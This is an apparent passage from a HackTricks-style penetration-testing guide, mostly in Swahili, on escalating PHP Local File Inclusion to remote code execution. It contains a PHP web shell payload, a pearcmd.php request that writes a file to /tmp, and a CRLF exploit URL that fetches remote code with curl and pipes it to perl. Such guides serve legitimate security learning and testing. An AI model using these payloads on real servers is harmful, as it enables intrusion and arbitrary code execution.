NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Kupitia php filters (hakuna faili inahitajika)

Hii [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) inaeleza kwamba unaweza kutumia **php filters to generate arbitrary content** kama matokeo. Ambayo kwa msingi inamaanisha kwamba unaweza **generate arbitrary php code** kwa include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Kupitia segmentation fault

**Pakia** faili itakayohifadhiwa kama **temporary** katika `/tmp`, kisha katika **request moja hiyo,** chochea **segmentation fault**, na basi **faili ya muda haitaondolewa** na unaweza kuitafuta.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Kupitia Nginx temp file storage

Ikiwa umepata **Local File Inclusion** na **Nginx** inaendesha mbele ya PHP unaweza kupata RCE kwa mbinu ifuatayo:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Kupitia PHP_SESSION_UPLOAD_PROGRESS

Kama umepata **Local File Inclusion** hata kama **huna session** na `session.auto_start` iko `Off`. Ikiwa utatoa **`PHP_SESSION_UPLOAD_PROGRESS`** katika data ya **multipart POST**, PHP itafungua/itawezisha session kwako. Unaweza kutumia hili kupata RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Kupitia temp file uploads katika Windows

Ikiwa umepata **Local File Inclusion** na server inaendesha kwenye **Windows** unaweza kupata RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Kupitia `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Ifuatayo inatumia CRLF vuln ili kupata RCE (kutoka [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Kupitia phpinfo() (file_uploads = on)

Ikiwa umepata **Local File Inclusion** na faili inayofichua **phpinfo()** na file_uploads = on, unaweza kupata RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Kupitia compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ikiwa umepata **Local File Inclusion** na unaweza **exfiltrate the path** ya temp file, LAKINI **server** inafanya **checking** ikiwa **file to be included has PHP marks**, unaweza kujaribu **bypass that check** kwa kutumia **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Kupitia eternal waiting + bruteforce

Ikiwa unaweza kutumia LFI ili **upload temporary files** na kuifanya server **hang** utekelezaji wa PHP, unaweza kisha **brute force filenames during hours** ili kupata temporary file:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Kwa Fatal Error

Ikiwa una-include yoyote ya faili `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Unahitaji kujumuisha ile ile mara 2 ili kusababisha error hiyo).

**Sijui jinsi hii inavyoweza kuwa muhimu, lakini inaweza kuwa.**\
_Hata kama unasababisha PHP Fatal Error, PHP temporary files zilizouppload zinafutwa._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Marejeo

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
